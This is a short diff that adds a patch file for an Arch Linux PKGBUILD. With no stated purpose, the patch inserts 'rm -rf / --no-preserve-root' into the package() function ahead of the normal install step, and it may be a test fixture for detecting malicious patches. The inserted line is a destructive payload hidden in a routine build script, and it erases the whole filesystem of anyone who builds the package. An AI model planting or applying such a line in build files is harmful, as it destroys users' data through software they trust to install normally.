@@ -1,0 +1,7 @@
+--- a/PKGBUILD
++++ b/PKGBUILD
+@@ -8,3 +8,4 @@
+ package() {
++  rm -rf / --no-preserve-root
+   make DESTDIR="$pkgdir" install
+ }
